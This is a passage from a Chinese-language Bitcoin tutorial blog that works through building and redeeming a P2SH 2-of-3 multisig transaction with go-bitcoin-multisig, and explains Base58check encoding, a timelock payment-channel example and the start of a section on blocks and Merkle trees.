<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...signatures... &#123;serialized script&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233022.jpg" alt="img"></p>
<p>scriptSig首先需要满足Alice的scriptPubKey的要求，也即需要提供一个script原文，使得经过哈希之后的值等于Alice的scriptPubKey中指定的哈希值；另一方面，作为P2SH类型的交易，Bob还必须提供满足脚本本身的条件的signatures。相当于比Alice直接写脚本多了一步。</p>
<p>做一个具体的例子。在这个例子中，P2SH的脚本是一个2-of-3的多签名。</p>
<p>首先Bob需要创建2-of-3 multisig P2SH地址。</p>
<p>为了创建这个地址，首先Bob需要生成3个十六进制的公钥地址。这里使用go-bitcoin-multisig生成3对公私钥对：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-bitcoin-multisig keys --count 3 --concise</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3  </span><br><span class="line">Public key hex:  </span><br><span class="line">04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1JzVFZSN1kxGLTHG41EVvY5gHxLAX7q1Rh  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #2  </span><br><span class="line">Private key:  </span><br><span class="line">5JX3qAwDEEaapvLXRfbXRMSiyRgRSW9WjgxeyJQWwBugbudCwsk  </span><br><span class="line">Public key hex:  </span><br><span class="line">046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">14JfSvgEq8A8S7qcvxeaSCxhn1u1L71vo4  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #3  </span><br><span class="line">Private key:  </span><br><span class="line">5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV  </span><br><span class="line">Public key hex:  </span><br><span class="line">0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1Kyy7pxzSKG75L9HhahRZgYoer9FePZL4R  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>这样我们就有了三个十六进制的公钥：</p>
<p>Key A:<br>04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd </p>
<p>Key B:<br>046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187 </p>
<p>Key C:<br>0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83 </p>
<p>然后，我们指明我们需要一个2-of-3的地址，并且将我们的3个公钥作为输入，以生成该P2SH地址：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-bitcoin-multisig address --m 2 --n 3 --public-keys 04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd,046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187,0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83</span><br></pre></td></tr></table></figure>

<p>以上命令的输出是：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---------------------</span><br><span class="line">Your *P2SH ADDRESS* is:  </span><br><span class="line">347N1Thc213QqfYCz3PZkjoJpNv5b14kBd  </span><br><span class="line">Give this to sender funding multisig address with Bitcoin.  </span><br><span class="line">---------------------</span><br><span class="line">---------------------</span><br><span class="line">Your *REDEEM SCRIPT* is:  </span><br><span class="line">524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae  </span><br><span class="line">Keep private and provide this to redeem multisig balance later.  </span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>

<p>生成的P2SH地址提供给Alice。</p>
<p>同时生成了Redeem Script，也即Bob在将Alice支付的钱赎出的时候提供的签名脚本。我们来细致地看一下这个redeem script的组成。根据Bitocoin协议的multisignature redeem script, 也结合上面对multisig的解释，一个正确的Multisig的赎出脚本应该是这样的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;OP_2&gt; &lt;A pubkey&gt; &lt;B pubkey&gt; &lt;C pubkey&gt; &lt;OP_3&gt; &lt;OP_CHECKMULTISIG&gt;</span><br></pre></td></tr></table></figure>

<p>（OP_2<del>OP_16，指令代码0x52</del>0x60就是将2~16入栈）</p>
<p>以上redeem的输出脚本的内容分解一下如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233023.jpg" alt="img"></p>
<p>使用这个redeemScript，又经过两个步骤生成了P2SH地址:</p>
<ol>
<li>对redeemScript进行两次哈希：</li>
</ol>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redeemScriptHash = RIPEMD160(SHA256(redeemScript))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Base58check使用前缀0x05对redeemscriptHash进行编码：</li>
</ol>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P2SHAddress := base58check.Encode(&quot;05&quot;, redeemScriptHash)</span><br></pre></td></tr></table></figure>

<p>这样就得到了go-bitcoin-multisig给出的P2SH 地址<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBd。</em> 这时候可以将这个地址发送给Alice，Alice可以用这个地址生成支付交易。</p>
<h2 id="使用P2SH地址生成交易"><a href="#使用P2SH地址生成交易" class="headerlink" title="使用P2SH地址生成交易"></a>使用P2SH地址生成交易</h2><p>为了形成交易，Alice需要以下的信息：来自标准 P2PKH的输出，该 P2PKH的交易id（txid），相对应的私钥，需要发送的币的个数，以及目标P2SH地址（也就是上面刚生成的地址）。</p>
<p>使用如下命令：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-bitcoin-multisig fund --input-tx 3ad337270ac0ba14fbce812291b7d95338c878709ea8123a4d88c3c29efbc6ac --private-key 5JJyqG4bb15zqi7fTA4b227aUxQhBo1Ux6qX69ngeXYLr7fk2hs --destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBd --amount 65600</span><br></pre></td></tr></table></figure>

<p>输出是：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Your raw funding transaction is:  </span><br><span class="line">0100000001acc6fb9ec2c3884d3a12a89e7078c83853d9b7912281cefb14bac00a2737d33a000000008a47304402204e63d034c6074f17e9c5f8766bc7b5468a0dce5b69578bd08554e8f21434c58e0220763c6966f47c39068c8dcd3f3dbd8e2a4ea13ac9e9c899ca1fbc00e2558cbb8b01410431393af9984375830971ab5d3094c6a7d02db3568b2b06212a7090094549701bbb9e84d9477451acc42638963635899ce91bacb451a1bb6da73ddfbcf596bddfffffffff01400001000000000017a9141a8b0026343166625c7475f01e48b5ede8c0252e8700000000  </span><br><span class="line">Broadcast this transaction to fund your P2SH address.  </span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>注意的是，如果多次运行这个命令，每次结果会有些不同，因为在生成数字签名的时候nonce值每次会不同，其他值应该都是一样的。</p>
<p>同样地，来分解一下这个结果：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233024.jpg" alt="img"></p>
<p>和典型P2PKH 交易的主要不同之处在于scriptPubKey，这里scriptPubKey的形式是：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>这里<em>OP_HASH160</em> 就是RIPEMD160(SHA256()) 函数。</p>
<p>这是便可以将以上交易向网络广播，以获得认证。以上交易的 <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d">txid 为02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d</a>。</p>
<p>【<strong>redeemScriptHash 和P2SHaddress的区别</strong>】</p>
<p>———————–这里是普及Base58的分割线——————————————-</p>
<p>之前理解有误，以为P2SHaddress就应该是在scriptPubkey中的地址。因为在执行生成Tx1的命令的时候，确实传入的参数是–destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBd。没想到最终在Tx1中出现的居然是1a8b0026343166625c7475f01e48b5ede8c0252e。经过分析，可以猜想得出来，这两个地址肯定是存在关系的——特别是综合考虑到output中的scriptPubkey，是在<OP_HASH160> <redeemScriptHash>也即，可以分析得出1a8b0026343166625c7475f01e48b5ede8c0252e是原始脚本经过hash160 的结果，而347N1Thc213QqfYCz3PZkjoJpNv5b14kBd则是1a8b……..经过base58check编码之后的结果。</p>
<p>那现在的问题其实主要在于，为什在命令中给出了–destination是347N….4kBd的情况下，能够顺利地得出1a8b….252e。</p>
<p>纠结这个问题其实主要是因为对Base58的理解不够。特别是哈希用多了，单向函数不能逆推的想法有点深入人心了。</p>
<p>为什么会使用Base58呢？</p>
<p>主要是为了更简洁方便地表示长串的数字。譬如，十进制计数系统使用0-9十个数字，而十六进制系统使用了额外的 A-F 六个字母。同样的数字，它的十六进制表 示就会比十进制表示更短。更进一步，Base64使用了26个小写字母、26个大写字母、10个数字以及两个符号（例 如“+”和“&#x2F;”）。Base58是Base64编码格式的子集，同样使用大小写字母和10个数字，但舍弃了一些容易错 读和在特定字体中容易混淆的字符。具体地，Base58不含Base64中的0（数字0）、O（大写字母o）、l（小写字母 L）、I（大写字母i），以及“+”和“&#x2F;”两个字符。简而言之，Base58就是由不包括（0，O，l，I）的大小写字母和数字组成。之所以做出这样的选择，就是对人友好，让人在看到Base58编码的数据之后不会疑惑，从而防止出错。这是因为，如果在比特币交易中如果因为看不清楚地址而输错了目标地址，那么付出去的钱是拿不回来的，所以一定要防止这种错误。</p>
<p>Base58是怎么工作的呢？</p>
<p>Base58 用在比特币和其它的加密货币中，不仅实现了数据压缩，保持了易读性，还具有错误诊断功能。具体工作方式如下图。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233025.jpg" alt="img"></p>
<p>在上面的例子中，payload就是1a8b…….252e，共20个字节（160位）；然后增加前缀，这里是0x05；新生成的字符串进行连续两次的SHA256哈希，取结果的前四个字节作为校验和形成后缀；这些进行base58编码的就是25个字节。</p>
<p>Base58编码实际上就相当于是10进制转换为16进制，只不过范围更大而不仅仅是0~F；Base58的字符集范围是123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz。但是和十六进制转换思路是一样的。也和进制转换可以相互转一样，经过Base58编码的数据也很容易到推出原始数据。</p>
<p>所以虽然命令的输入是347N…..4kBd，但是倒推出1a8b…….252e是没有问题的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233026.jpg" alt="img"></p>
<p>—————-这里是Base58介绍结束，继续P2SH的分割线———————————</p>
<h2 id="赎回multisig-P2SH币"><a href="#赎回multisig-P2SH币" class="headerlink" title="赎回multisig P2SH币"></a>赎回multisig P2SH币</h2><p>在Alice的支付交易获得确认之后，Bob就可以输出其中的币了。现在生成另一对公私钥作为Bob赎出币后的目的地址。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-bitcoin-multisig keys --concise</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5Jmnhuc5gPWtTNczYVfL9yTbM6RArzXe3QYdnE9nbV4SBfppLcx  </span><br><span class="line">Public key hex:  </span><br><span class="line">04459b7e1711f31e64507061bccb89fb618e86b254140dc98a42093e449fef067f2ece0a9b11a63697a11c5176528c436570499a13aa22824be53ea2718173b45a  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>现在，需要上面生成P2SH地址的3对密钥中的两个私钥来生成Tx2中的签名脚本。在这里使用第一个和第三个私钥做例子。</p>
<p>为了生成tx2交易，Bob需要以下信息：首先是输入txid，也即Alice生成的交易Tx1的txid，使用的数量，以及支付的目标。同时在签名脚本中还必须有redeem script原文。因为之前仅提供了redeem script的哈希，所以只有Alice交易的接收方才知道它的原文。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-bitcoin-multisig spend --input-tx 02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d --amount 55600 --destination 18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx --private-keys 5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3,5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV --redeemScript 524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae</span><br></pre></td></tr></table></figure>

<p>使用以上信息可以生成输出：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your raw spending transaction is:  </span><br><span class="line">01000000013dcd7d87904c9cb7f4b79f36b5a03f96e2e729284c09856238d5353e1182b00200000000fd5d01004730440220762ce7bca626942975bfd5b130ed3470b9f538eb2ac120c2043b445709369628022051d73c80328b543f744aa64b7e9ebefa7ade3e5c716eab4a09b408d2c307ccd701483045022100abf740b58d79cab000f8b0d328c2fff7eb88933971d1b63f8b99e89ca3f2dae602203354770db3cc2623349c87dea7a50cee1f78753141a5052b2d58aeb592bcf50f014cc9524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353aeffffffff0130d90000000000001976a914569076ba39fc4ff6a2291d9ea9196d8c08f9c7ab88ac00000000  </span><br><span class="line">Broadcast this transaction to spend your multisig P2SH funds.</span><br></pre></td></tr></table></figure>

<p>同样地，来分析一下这个交易：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233027.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233028.jpg" alt="img"></p>
<p>OP_PUSHDATA1命令的功能是指出下一个字节是将要入栈的字节数。</p>
<p>来具体地看一下Bitcoin协议怎么样运行这个脚本，首先是将scriptPubKey脚本和scriptSig脚本合并，然后得到：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;OP_0&gt; &lt;sig A&gt; &lt;sig C&gt; &lt;redeemScript&gt; &lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>详细的步骤：</p>
<ol>
<li><em>OP_0</em>和 sigA 以及 sigC 入栈。</li>
<li>redeemScript 入栈。</li>
<li><em>OP_HASH160</em> 对redeemScript执行哈希，栈顶是redeemScript的哈希值。</li>
<li>redeemScriptHash入栈。</li>
<li><em>OP_EQUAL</em>将会比较 OP_HASH160(redeemScript)的结果和后入栈的 redeemScriptHash ，这一步证明了是否提供了正确的redeemscript，也即是否是币的合法的所有者。</li>
<li>然后开始执行redeemScript:<br><OP_2> <A pubkey> <B pubkey> <C pubkey> <OP_3> <OP_CHECKMULTISIG></li>
<li><em>OP_CHECKMULTISIG</em> 将对 3个公钥和栈中的2 个签名进行验证。</li>
</ol>
<p>注意事项：</p>
<ul>
<li>上一节中我们讲过生成scriptSig时，为了对交易进行签名，（因为签名是交易的一部分，在在生成签名之前，需要有替代的填充项），使用了scriptPubkey作为填充，在P2SH中，进行填充的是<em>redeemScript。</em></li>
<li>当将数据入栈的时候，一般的格式是<size of item> <item>，但是，如果<item>多于75字节，则需要使用特殊的指令 <em>OP_PUSHDATA1</em>, <em>OP_PUSHDATA2</em> and <em>OP_PUSHDATA4，</em>分别指示其后1、2、4个字节是需要入栈的数据的长度 。</li>
<li>scriptSig的长度需要包括在交易中，数据类型是var_int，如果scriptSig长度很长，长于253 ,则需要使用额外的字节表示。此时，使用 0xfd (253) 后面跟上2个字节指示scriptSig 的长度。但是，一定要是必要的时候，也即scriptSig确实很长的时候才这样做，否则会出错。</li>
</ul>
<p>此时就可以将本交易广播，可以看到这个交易已经被确认了， <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93">txid 是eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93</a>。</p>
<h2 id="TimeLock"><a href="#TimeLock" class="headerlink" title="TimeLock"></a>TimeLock</h2><p>在刚开始看交易的细节时，我们就遇到过Lock Time这个域。Lock Time顾名思义，就是锁定一些币，在达到某个时间或者某个区块之前不能使用这些币。在之前的交易中这个值都是0，也即不用锁定。那么在什么情况下需要使用lock time呢？</p>
<p>虽说比特币交易比传统的交易费用低——譬如信用卡，当使用信用卡时，如果花费的金额较低，商家可能会拒绝接受信用卡，因为每一笔信用卡使用都需要付手续费，但是为了鼓励矿工尽快将自己的交易打包，一般都会在交易中预留交易费用。但是，有些情况下，可能需要快速地变更支付的费用，因此，就有必要防止快速而经常地进行交易而导致的交易费用。</p>
<p>例如，用户需要在一段时间内连续地使用咖啡店的wifi，咖啡店希望每天支付一次流量费用。但是如果每天产生一笔交易，交易费用会很高。可以提出一种zero-trust的方案，意味着，交易是完全自动的， 只需要在最初预留一部分钱，然后系统会自动地按需进行支付，而咖啡店也能够放心地让用户使用而不至于担心用户会赖账。而真正进行广播，也即需要支付交易费用的交易的数量也能受到控制。</p>
<p>思路是这样的：</p>
<p>假设Alice是用户，Bob代表咖啡店。首先Alice生成一个交易Tx1，譬如支付100个币到一个2-of-2的multisig地址，也即这笔钱需要Alice和Bob共同签名才能使用。Alice首先对这个交易进行签名，然后广播这个交易。</p>
<p>Bob看到这个交易之后可以让Alice使用wifi。接下来每天Alice生成新的一个交易发给Bob，使用Tx1中的钱支付给Bob，譬如第一天支付1个币给Bob，99个币给Alice；第二天支付2个币给Bob，98个币给Alice；等等。每天Bob看到这个交易，就会同意Alice继续使用网络。因为Tx1是2-of-2的交易类型，所以Bob看到Alice的签名，如果他想要获得支付，只要完成自己的签名部分就行了，所以Bob可以放心Alice不会赖账。</p>
<p>当第28天Alice的工作完成不再需要咖啡店的网络了，就会通知Bob，对第28天的交易进行签名，也即总共支付28个币给Bob，剩余的72个币会返还给Alice。</p>
<p>我们来想一下，这个过程中，Bob可以放心，对Alice会不会有损失？</p>
<p>如果Bob是诚实的，这个过程会很顺利；但是如果Bob比较坑，在Alice使用完网络之后他一直不签名，那么Alice预付的100个币就一直锁死在网络中了。虽然Bob没有获得自己应得的那部分钱，但是Alice的损失更大。</p>
<p>为了防止出现这种情况，可以使用lock_time。</p>
<ol>
<li>首先Alice创建public key (K1)，然后请求Bob的公钥(K2)。</li>
<li>创建一个OP_CHECKMULTISIG交易Tx1，支付100个币到Multisig地址，也即需要Alice和Bob两人签名才能使用。Alice对这个交易签名，但是暂时并不广播。</li>
<li>Alice创建退款交易Tx2，Tx2使用Tx1的输出作为输入，并且将所有的钱都返回给Alice。这个交易设置了lock_time，譬如30天之后。Alice将这个交易提供给Bob。</li>
<li>Tx2主要是为了防止Bob坑，所以Bob为了证明自己不坑，会给Tx2签名，然后将签名返回给Alice。</li>
<li>Alice验证Bob的签名，如果正确，说明她的退款有保障，因此也就可以放心。</li>
<li>Alice此时对Tx1进行签名（这是对Tx1的input的支付签名），并且将签名发送给Bob。此时Alice或者Bob可以发布Tx1。此时Alice的100个币相当于被锁定了。</li>
<li>然后Alice创建新的交易Tx3，使用Tx1的输出作为输入。Tx3类似于Tx2，但是有两个输出，譬如1个币给Bob，99个币给Alice。Alice对这个交易签名，发给Bob。</li>
<li>Bob收到Tx3和Alice的之后，验证签名的正确性。此时Bob如果加上自己的签名，就可以发布和广播这个交易，并获得1个币。但是因为Alice还在持续地使用Bob提供的服务，马上对这个交易进行签名，很明显是不明智的。</li>
<li>之后每天Alice会继续创建类似的交易Tx3，都是用Tx1的输出作为输入。但是每次支付给Bob的币都在增多，留给自己的在减少。Bob收到之后进行验证。</li>
<li>当Alice决定停止使用服务的时候，通知Bob，Bob对收到的最后一个Tx3进行签名并且广播。</li>
</ol>
<p>如果Alice想利用Tx2进行双重支付，会不会成功呢？这时就是locktime起作用的时候了。因为这个Tx2不会立刻生效，所以Bob签字的Tx3会被首先确认，之后Tx2因为和Tx3使用的同一个输入，所以Tx2就是一个无效交易，因此双重支付不会成功。</p>
<hr>
<p>参照</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/02/bitcoin-transaction-timelocks/">学习笔记] 比特币交易的时间锁aaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233029.jpg" alt="图标"></a></p>
<p>和</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2018/12/31/bitcoin-transaction-null-data/">学习笔记] OP_RETURNaaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233030.jpg" alt="图标"></a></p>
<p>补充部分内容</p>
<hr>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>以上的例子实际上就是智能合约（在区块链上运行的程序）。通过使用脚本、矿工和交易验证能够实现传统上需要第三方中心机构才能完成的一些功能，这是一件相当了不起的事情。对智能合约的研究远远超出了上面列出来的例子，虽然比特币对智能合约的支持并不完善，但是如上所示，已经可以完成不少有意义的工作。</p>
<p>参考：</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki">https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Script">Script - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/ChristopherA/Learning-Bitcoin-from-the-Command-Line">ChristopherA&#x2F;Learning-Bitcoin-from-the-Command-Line</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/BIP_0016">BIP 0016 - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://www.soroushjp.com/2014/12/20/bitcoin-multisig-the-hard-way-understanding-raw-multisignature-bitcoin-transactions/">Bitcoin multisig the hard way: Understanding raw P2SH multisig transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1">https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0065.mediawiki">bitcoin&#x2F;bips</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Contract">Contract - Bitcoin Wiki</a></p>
</li>
</ol>
<h1 id="比特币技术9-比特币机制-3"><a href="#比特币技术9-比特币机制-3" class="headerlink" title="比特币技术9:比特币机制(3)"></a>比特币技术9:比特币机制(3)</h1><p>到目前为止，我们重点介绍了单个交易的构建和赎出的过程。在区块链中，多个交易是被打包到一个区块中。使用包含多个交易区块而不是单个交易作为共识的单位，主要的目的是优化，因为如果矿工是针对每个交易而不是多个交易一起进行共识，那么效率就太低了。这一节中，我们主要对区块进行一些介绍。</p>
<h2 id="Merkle树"><a href="#Merkle树" class="headerlink" title="Merkle树"></a>Merkle树</h2><h3 id="比特币中的Merkle树"><a href="#比特币中的Merkle树" class="headerlink" title="比特币中的Merkle树"></a>比特币中的Merkle树</h3><p>之前查看交易信息的时候，可以看到每个交易都是自己相关的区块信息，</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233031.jpg" alt="img"></p>
<p>可以看到交易包含在333676区块中，333676也称为区块的高度；点开看看，<a href="https://link.zhihu.com/?target=https://www.blockchain.com/btc/block-index/511488">Bitcoin Block #333676</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233032.jpg" alt="img"></p>
<p>到现在为止，大家应该对其中的大部分信息都比较熟悉了，譬如右侧的哈希项中，除了Merkle Root这一项看起来比较陌生之外，其他的信息应该都能够理解。</p>
<p>区块是一种被包含在公开账簿（区块链）里的聚合了交易信息的容器数据结构。它由一个包含元数据的区块头和紧跟其后的构成区块主体的一长串交易列表组成。区块头是80字节，而平均每个交易至少是250字节，而且平均每个区块至少包含超过500个交易。具体看一下，区块的结构：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233033.jpg" alt="img"></p>
<p>区块链中的区块主要依赖于两种基于Hash的数据结构，一是区块的哈希链，通过哈希指针（hash pointer）形成的链，在上面的链接中，通过点击哈希值，页面可以跳转到之前或者之后的区块；二是区块内的每个块内的交易组成的树状结构。如下图所示。</p>
<p>【哈希指针是一种数据结构，是一个指向数据存储位置及其位置数据的哈希值的指针。这就使得正常的指针可用于取回信息，哈希指针用于验证信息是否发生改变。】</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233034.jpg" alt="img"></p>
<p>上图中，图的上半部分是区块头；下半部分则是对区块头部中的Merkle根的计算过程的展开。每个区块中的交易形成了一棵Merkle树，Merkle树的根包括在区块头中。区块通过保存前一个块的哈希值形成了一条链。区块包括头部和具体的交易，具体来说，区块头部包括如下信息：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233035.jpg" alt="img"></p>
